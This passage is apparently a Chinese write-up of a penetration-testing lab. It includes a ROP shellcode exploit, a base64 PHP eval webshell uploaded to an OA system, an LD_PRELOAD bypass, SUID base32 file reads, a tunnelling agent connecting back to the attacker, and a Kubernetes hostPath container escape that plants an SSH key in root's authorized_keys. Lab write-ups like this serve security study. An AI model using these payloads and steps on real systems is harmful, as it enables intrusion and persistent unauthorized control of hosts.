+    update_entry<span class="token punctuation">(</span><span class="token string">b'aahO'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
+
+<span class="token comment"># Leak the stack address</span>
+environ <span class="token operator">=</span> <span class="token number">0x5e4c38</span> 
+arbitrary_read<span class="token punctuation">(</span>environ<span class="token punctuation">)</span>
+stack_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+success<span class="token punctuation">(</span><span class="token string">'stack_addr'</span><span class="token punctuation">,</span> stack_addr<span class="token punctuation">)</span>
+
+<span class="token comment"># ROP gadgets</span>
+rdi <span class="token operator">=</span> <span class="token number">0x0000000000405e7c</span>
+rsi <span class="token operator">=</span> <span class="token number">0x000000000040974f</span>
+rax <span class="token operator">=</span> <span class="token number">0x00000000004206ba</span>
+rdx_rbx <span class="token operator">=</span> <span class="token number">0x000000000053514b</span>
+shr_eax_2 <span class="token operator">=</span> <span class="token number">0x0000000000523f2e</span>
+syscall_ret <span class="token operator">=</span> <span class="token number">0x00000000004d9776</span>
+
+<span class="token comment"># ROP payload to map memory and jump to shellcode</span>
+payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>username_addr <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0xfff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdx_rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rax<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xa</span> <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>shr_eax_2<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>username_addr <span class="token operator">+</span> <span class="token number">0x48</span><span class="token punctuation">)</span>
+
+arbitrary_write<span class="token punctuation">(</span>stack_addr <span class="token operator">-</span> <span class="token number">0x210</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'uname -ar'</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>提权后能拿到本机的flag</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /root/flag_RaYz1/f* <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h3 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h3><p>上面知道26有一个新翔OA管理系统，有漏洞直接复现</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62501867/article/details/142388022">https://blog.csdn.net/m0_62501867/article/details/142388022</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/1e97820801f863fa8e22978a07aab7fd.png"></p>
+<p>用蚁剑的插件绕过</p>
+<h5 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h5><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/9959d5616384ab489c18e09ed4bc9e38.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">imgbase64=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWycxJ10pOw==
+http://172.28.23.26/uploadbase64.php
+{"src":"upload/2025-09-11-68c28ca682098.php"}\
+
+http://172.28.23.26/upload/2025-09-11-68c28ca682098.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">默认生成.antproxy.php，已修改为qq.php
+/var/www/html/OAsystem/upload/qq.php
+/tmp/.69433ant_x64.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>新建一个 get 型木马 <code>shell.php</code>（post 型在当前环境无法利用成功）：</p>
+<pre class="line-numbers language-none"><code class="language-none">imgbase64=data:image/php;base64,PD9waHAgQGV2YWwoJF9HRVRbJzEnXSk7
+{"src":"upload/2025-09-11-68c2994da6a75.php"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>修改 <code>qq.php</code>，使其指向 <code>shell.php</code>：</p>
+<pre class="line-numbers language-none"><code class="language-none"># 将 $url = "/2025-09-11-68c28ca682098.php"; 修改为"upload/2025-09-11-68c2994da6a75.php"(因为用插件时会改变路径，不加upload的话会找不到【不在一个路径下】)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/216efd3403811a766caa9013caf47b05.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/f4b5f89fedbe013251aba75e0bdd80cd.png"></p>
+<p>or</p>
+<h5 id="PHP7-Backtrace-UAF"><a href="#PHP7-Backtrace-UAF" class="headerlink" title="PHP7 Backtrace UAF"></a>PHP7 Backtrace UAF</h5><p>可以直接返回一个 shell，但这个方式执行命令不是特别稳定。</p>
+<p>提权</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>www-data:/var/www/html/OAsystem/upload<span class="token punctuation">)</span> $ <span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
+/bin/fusermount
+/bin/ping6
+/bin/mount
+/bin/su
+/bin/ping
+/bin/umount
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/staprun
+/usr/bin/base32
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/s-nail/s-nail-privsep<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>用<code>base32</code></p>
+<pre class="line-numbers language-none"><code class="language-none">/usr/bin/base32 /flag02.txt
+MZWGCZZQGI5CAZTMMFTXWNJWMQZTONZTGQWTKZRXGMWTINBXMYWWEMLBGUWWCOBTMY2DKNJUHFRD
+EOD5BI======
+
+flag02: flag{56d37734-5f73-447f-b1a5-a83f45549b28}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h3 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h3><p>26</p>
+<pre class="line-numbers language-none"><code class="language-none">eth0      Link encap:Ethernet  HWaddr 00:16:3e:05:2c:24  
+          inet addr:172.28.23.26  Bcast:172.28.255.255  Mask:255.255.0.0
+          inet6 addr: fe80::216:3eff:fe05:2c24/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:210198 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:64384 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:232189119 (232.1 MB)  TX bytes:55952974 (55.9 MB)
+eth1      Link encap:Ethernet  HWaddr 00:16:3e:05:2b:f2  
+          inet addr:172.22.14.6  Bcast:172.22.255.255  Mask:255.255.0.0
+          inet6 addr: fe80::216:3eff:fe05:2bf2/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:84417 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:83290 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:11894620 (11.8 MB)  TX bytes:16336530 (16.3 MB)
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:14119 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:14119 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:9210359 (9.2 MB)  TX bytes:9210359 (9.2 MB)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">172.22.14.46:80 open
+172.22.14.37:22 open
+172.22.14.46:22 open
+172.22.14.6:80 open
+172.22.14.6:22 open
+172.22.14.37:2379 open
+172.22.14.37:10250 open
+172.22.14.6:21 open
+[*] WebTitle http://172.22.14.46       code:200 len:785    title:Harbor
+[+] InfoScan http://172.22.14.46       [Harbor] 
+[*] WebTitle http://172.22.14.6        code:200 len:13693  title:新翔OA管理系统-OA管理平台联系电话：13849422648微信同号，QQ958756413
+[*] WebTitle https://172.22.14.37:10250 code:404 len:19     title:None
+[+] ftp 172.22.14.6:21:anonymous 
+   [-&gt;]OASystem.zip
+[+] PocScan http://172.22.14.46/swagger.json poc-yaml-swagger-ui-unauth [{path swagger.json}]
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<pre class="line-numbers language-none"><code class="language-none">在stowawy上
+listen
+use 0
+listen
+1
+44440
+
+在目标机上./linux_x64_agent -c 172.28.23.17:44440即可
+
+然后
+back
+use 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>看一下网</p>
+<pre class="line-numbers language-none"><code class="language-none">172.22.14.37:22 open
+172.22.14.37:2380 open
+172.22.14.37:2379 open
+172.22.14.37:6443 open
+172.22.14.37:10252 open
+172.22.14.37:10250 open
+172.22.14.37:10251 open
+172.22.14.37:10256 open
+[*] WebTitle http://172.22.14.37:10251 code:404 len:19     title:None
+[*] WebTitle http://172.22.14.37:10252 code:404 len:19     title:None
+[*] WebTitle https://172.22.14.37:6443 code:200 len:4671   title:None
+[*] WebTitle http://172.22.14.37:10256 code:404 len:19     title:None
+[*] WebTitle https://172.22.14.37:10250 code:404 len:19     title:None
+[+] PocScan https://172.22.14.37:6443 poc-yaml-go-pprof-leak 
+[+] PocScan https://172.22.14.37:6443 poc-yaml-kubernetes-unauth 
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><a target="_blank" rel="noopener" href="https://l0n9w4y.cc/posts/33009/">https://l0n9w4y.cc/posts/33009/</a></p>
+<p>存在 Kubernetes API server 未授权：</p>
+<pre class="line-numbers language-none"><code class="language-none">https://172.22.14.37:6443<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2f5abc2300016ca923b9b179447bc26a.png"></p>
+<p><a target="_blank" rel="noopener" href="https://kubernetes.io/zh-cn/docs/tasks/tools/install-kubectl-linux/">在 Linux 系统中安装并设置 kubectl | Kubernetes</a></p>
+<blockquote>
+<p>ubectl 是go binary，而go binary 自己实现了底层，所以proxychains对他不起作用</p>
+<p>具体的打法就是写一个evil-deployment.yaml，然后我们把宿主机/目录挂载到容器内部/mnt目录，接着写公钥就成功逃逸</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">PS E:\ctf\web\tools&gt; kubectl -s https://172.22.14.37:6443/ get pods（查看 pod（用户名密码输入任意内容即可）：）
+Please enter Username: xianxinshh
+Please enter Password: Unable to connect to the server: tls: failed to verify certificate: x509: certificate signed by unknown authority
+
+列出pod
+PS E:\ctf\web\tools&gt; kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods
+Please enter Username: xianxinshh
+Please enter Password: NAME                                READY   STATUS    RESTARTS   AGE
+nginx-deployment                    1/1     Running   0          3h31m
+nginx-deployment-864f8bfd6f-st7ch   1/1     Running   0          137m
+
+查看 pod 资源：
+PS E:\ctf\web\tools&gt; kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ describe pod nginx-deployment-864f8bfd6f-st7ch
+Please enter Username: xianxinshh
+Please enter Password: Name:             nginx-deployment-864f8bfd6f-st7ch
+Namespace:        default
+Priority:         0
+Service Account:  default
+Node:             ubuntu-k8s/172.22.14.37
+Start Time:       Thu, 11 Sep 2025 20:56:22 +0800
+Labels:           app=nginx
+                  pod-template-hash=864f8bfd6f
+Annotations:      &lt;none&gt;
+Status:           Running
+IP:               10.244.0.16
+IPs:
+  IP:           10.244.0.16
+Controlled By:  ReplicaSet/nginx-deployment-864f8bfd6f
+Containers:
+  nginx:
+    Container ID:   docker://8c6689484fece58fe39b9a82f6fa7aecb7fdfb0cd964554e07ae124fd37b249b
+    Image:          nginx:1.8（***********||||***********）
+    Image ID:       docker-pullable://nginx@sha256:c97ee70c4048fe79765f7c2ec0931957c2898f47400128f4f3640d0ae5d60d10
+    Port:           &lt;none&gt;
+    Host Port:      &lt;none&gt;
+    State:          Running
+      Started:      Thu, 11 Sep 2025 20:56:23 +0800
+    Ready:          True
+    Restart Count:  0
+    Environment:    &lt;none&gt;
+    Mounts:
+      /mnt from test-volume (rw)
+      /var/run/secrets/kubernetes.io/serviceaccount from default-token-6d2pl (ro)
+Conditions:
+  Type              Status
+  Initialized       True
+  Ready             True
+  ContainersReady   True
+  PodScheduled      True
+Volumes:
+  test-volume:
+    Type:          HostPath (bare host directory volume)
+    Path:          /
+    HostPathType:
+  default-token-6d2pl:
+    Type:        Secret (a volume populated by a Secret)
+    SecretName:  default-token-6d2pl
+    Optional:    false
+QoS Class:       BestEffort
+Node-Selectors:  &lt;none&gt;
+Tolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
+                 node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
+Events:          &lt;none&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>同样，用 <code>nginx:1.8</code> 镜像创建名为 nginx-deployment 的 pod，将宿主机的目录挂载到 /mnt 目录。新建 test.yaml 文件，内容如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">apiVersion: v1
+kind: Pod
+metadata:
+  name: nginx-deployment
+spec:
+  containers:
+  - image: nginx:1.8
+    name: container
+    volumeMounts:
+    - mountPath: /mnt
+      name: xianxinshh
+  volumes:
+  - name: test
+    hostPath:
+      path: /<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>创建 pod 并查看运行情况：</p>
+<pre class="line-numbers language-none"><code class="language-none">kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ apply -f test.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>写入 SSH 公钥（我们登上的和ssh上的不一样，这次连上的root里没flag,ssh上就能看见）</p>
+<pre class="line-numbers language-none"><code class="language-none">kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ exec -it nginx-deployment -- /bin/bash
+-----
+
+root@nginx-deployment:/# echo "ssh-rsa YOUR_KEY_HERE" &gt; /mnt/root/.ssh/authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>先在本地机子创建rsa密钥</p>
+<pre class="line-numbers language-none"><code class="language-none">ssh-keygen -t rsa -b 4096<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023/10/19.png" alt="img"></p>
+<p>可以看到我生成的公私钥创建在了/home/fushuling/.ssh/目录下，/home/fushuling/.ssh/id_rsa.pub的内容就是我们要写入的公钥</p>
+<p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023/10/20.png" alt="img"></p>
+<p>在弹的shell上执行：</p>
+<pre class="line-numbers language-none"><code class="language-none">cd /root
+mkdir .ssh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>然后把公钥传进去</p>
+<pre class="line-numbers language-none"><code class="language-none">echo "公钥内容" &gt;&gt;/root/.ssh/authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>接下来回到我们本地的机子上，就能用私钥连接上去了</p>
+<p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023/10/21.png" alt="img"></p>
+<p>当然，我们也可以把id_rsa的内容保存出来用xshell连上去，我后面就这么打的</p>
+</blockquote>
+<p>通过公钥 SSH 连接：</p>
+<pre class="line-numbers language-none"><code class="language-none">ssh -i id_rsa root@172.22.14.37<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>当前目录存在 <code>.mysql_history</code>：</p>
+<pre class="line-numbers language-none"><code class="language-none">root@ubuntu-k8s（ssh上有这个k8s）:~# cat .mysql_history
+_HiStOrY_V2_
+show\040databases;
+create\040database\040flaghaha;
+use\040flaghaha
+DROP\040TABLE\040IF\040EXISTS\040`f1ag`;
+CREATE\040TABLE\040`flag06`\040(
+`id`\040int\040DEFAULT\040NULL,
+\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL
+)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;
+CREATE\040TABLE\040`flag06`\040(\040`id`\040int\040DEFAULT\040NULL,\040\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL\040)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;
+show\040tables;
+drop\040table\040flag06;
+DROP\040TABLE\040IF\040EXISTS\040`f1ag`;
+CREATE\040TABLE\040`flag04`\040(
+`id`\040int\040DEFAULT\040NULL,
+\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL
+)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;
+CREATE\040TABLE\040`flag04`\040(\040`id`\040int\040DEFAULT\040NULL,\040\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL\040)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;
+INSERT\040INTO\040`flag`\040VALUES\040(1,\040'ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==');
+INSERT\040INTO\040`flag04`\040VALUES\040(1,\040'ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==');
+exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/6e15ee518fda117f7a03d899df6db887.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">flag{da69c459-7fe5-4535-b8d1-15fff496a29f}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h5 id="k8s"><a href="#k8s" class="headerlink" title="k8s"></a>k8s</h5><p>本质是<strong>Kubernetes 容器逃逸攻击</strong>的一种典型场景 —— 核心是利用 K8s 权限配置漏洞，让恶意容器获取宿主机的完全访问权，最终通过 “写入 SSH 公钥” 实现对宿主机的长期控制。下面用 “大白话 + 步骤拆解” 讲清楚每一步的逻辑，为什么能成、背后原理是什么：</p>
+<p>先明确前提：这种攻击能成功，需要 K8s 集群存在 “权限配置错误”</p>
+<p>正常情况下，K8s 容器是 “隔离” 的 —— 容器里的操作只能在自己的 “小环境” 里，不能随便访问宿主机的文件 / 资源。但如果管理员配置失误（比如给容器开了过高权限），就会给攻击者可乘之机。<br>常见的 “危险配置” 有两种（也是这种攻击的前提）：</p>
+<ol>
+<li>容器以<code>privileged: true</code>（特权模式）启动：相当于容器拥有宿主机的 root 权限，能直接操作宿主机内核 / 硬件；</li>
+<li>容器挂载了宿主机的<code>/</code>目录（根目录）：把宿主机的所有文件（比如<code>/etc</code>用户配置、<code>/root</code>管理员目录）“映射” 到容器里，容器改挂载目录的文件，就等于改宿主机的文件。</li>
+</ol>
+<p>第一步：写 “evil-deployment.yaml”—— 本质是定义一个 “恶意容器” 的启动规则</p>
+<p>“deployment.yaml” 是 K8s 里用来定义 “怎么启动容器” 的配置文件（比如启动多少个容器、用什么镜像、给什么权限）。<br>“evil”（恶意）的核心，就是在配置里加两个 “危险项”：</p>
+<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># evil-deployment.yaml 关键内容（简化版）</span>
+<span class="token key atrule">apiVersion</span><span class="token punctuation">:</span> apps/v1
+<span class="token key atrule">kind</span><span class="token punctuation">:</span> Deployment
+<span class="token key atrule">metadata</span><span class="token punctuation">:</span>
+  <span class="token key atrule">name</span><span class="token punctuation">:</span> evil<span class="token punctuation">-</span>container  <span class="token comment"># 恶意容器的名字</span>
+<span class="token key atrule">spec</span><span class="token punctuation">:</span>
+  <span class="token key atrule">replicas</span><span class="token punctuation">:</span> <span class="token number">1</span>  <span class="token comment"># 启动1个容器</span>
+  <span class="token key atrule">template</span><span class="token punctuation">:</span>
+    <span class="token key atrule">spec</span><span class="token punctuation">:</span>
+      <span class="token key atrule">containers</span><span class="token punctuation">:</span>
+      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> evil<span class="token punctuation">-</span>box
+        <span class="token key atrule">image</span><span class="token punctuation">:</span> ubuntu<span class="token punctuation">:</span>latest  <span class="token comment"># 用一个常见的Linux镜像（比如Ubuntu）</span>
+        <span class="token comment"># 危险配置1：挂载宿主机的根目录“/”到容器的“/mnt”目录</span>
+        <span class="token key atrule">volumeMounts</span><span class="token punctuation">:</span>
+        <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> host<span class="token punctuation">-</span>root  <span class="token comment"># 挂载卷的名字（自定义）</span>
+          <span class="token key atrule">mountPath</span><span class="token punctuation">:</span> /mnt  <span class="token comment"># 容器里的目录（挂载后，访问/mnt就等于访问宿主机/）</span>
+        <span class="token comment"># 危险配置2：开启特权模式（如果没开挂载，特权模式也能间接逃逸）</span>
+        <span class="token key atrule">securityContext</span><span class="token punctuation">:</span>
+          <span class="token key atrule">privileged</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
+      <span class="token comment"># 定义要挂载的宿主机目录</span>
+      <span class="token key atrule">volumes</span><span class="token punctuation">:</span>
+      <span class="token punctuation">-</span> <span class="token key atrule">name</span><span class="token punctuation">:</span> host<span class="token punctuation">-</span>root
+        <span class="token key atrule">hostPath</span><span class="token punctuation">:</span>
+          <span class="token key atrule">path</span><span class="token punctuation">:</span> /  <span class="token comment"># 宿主机的根目录（这是关键！把宿主机所有文件映射进去）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>为什么要这么写？</p>
+<ul>
+<li><code>volumeMounts</code> + <code>hostPath: path: /</code>：相当于把宿主机的 “C 盘”（如果是 Linux 宿主机就是根目录）整个 “复制” 到容器的<code>/mnt</code>目录下。比如在容器里改<code>/mnt/root/.ssh/authorized_keys</code>，就等于改宿主机<code>root</code>用户的 SSH 授权文件。</li>
+<li><code>privileged: true</code>：就算挂载有问题，特权容器也能通过修改宿主机内核参数、挂载设备等方式逃逸，相当于给容器 “万能钥匙”。</li>
+</ul>
+<p>第二步：部署恶意容器到 K8s 集群，实现 “宿主机目录挂载”</p>
+<p>攻击者拿到这个<code>evil-deployment.yaml</code>后，需要执行 K8s 命令，让集群启动这个恶意容器：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 在K8s集群里执行（需要有创建deployment的权限，比如被劫持的service account权限）</span>
+kubectl apply <span class="token parameter variable">-f</span> evil-deployment.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>执行后，K8s 会在某个宿主机上启动这个容器，并且按照配置：</p>
+<ul>
+<li>宿主机的<code>/</code>目录 → 挂载到容器的<code>/mnt</code>目录；</li>
+<li>容器拥有宿主机的 root 权限（特权模式）。</li>
+</ul>
+<p>第三步：进入恶意容器，给宿主机 root 用户 “写 SSH 公钥”—— 实现长期控制</p>
+<p>这一步是 “逃逸的核心目标”：既然能访问宿主机的所有文件，那只要给宿主机的<code>root</code>用户（最高权限）添加攻击者的 SSH 公钥，攻击者后续就能直接用 SSH 登录宿主机，不用再依赖 K8s。</p>
+<p>具体操作（在容器内部执行）：</p>
+<ol>
+<li><p><strong>生成 SSH 密钥对</strong>（如果攻击者本地没有）：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 容器里执行（其实本地生成好公钥传进来更隐蔽）</span>
+ssh-keygen <span class="token parameter variable">-t</span> rsa  <span class="token comment"># 一路按回车，生成私钥id_rsa、公钥id_rsa.pub</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+</li>
+<li><p><strong>把攻击者的公钥，写入宿主机 root 用户的 SSH 授权文件</strong>：<br>宿主机 root 用户的 SSH 授权文件路径是<code>/root/.ssh/authorized_keys</code>，而容器里访问这个文件的路径是<code>/mnt/root/.ssh/authorized_keys</code>（因为挂载了宿主机 / 到 /mnt）。<br>执行命令：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 把公钥内容追加到宿主机的authorized_keys里</span>
+<span class="token function">cat</span> ~/.ssh/id_rsa.pub <span class="token operator">&gt;&gt;</span> /mnt/root/.ssh/authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+</li>
+<li><p><strong>验证效果</strong>：<br>攻击者现在可以用自己的 SSH 私钥，直接登录宿主机的 root 用户：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 攻击者本地执行（知道宿主机IP即可）</span>
+<span class="token function">ssh</span> <span class="token parameter variable">-i</span> 自己的私钥文件 root@宿主机IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>因为宿主机 root 的 authorized_keys 里有攻击者的公钥，所以能直接登录 —— 这就实现了 “从 K8s 容器逃逸到宿主机，并且长期控制”。</p>
+</li>
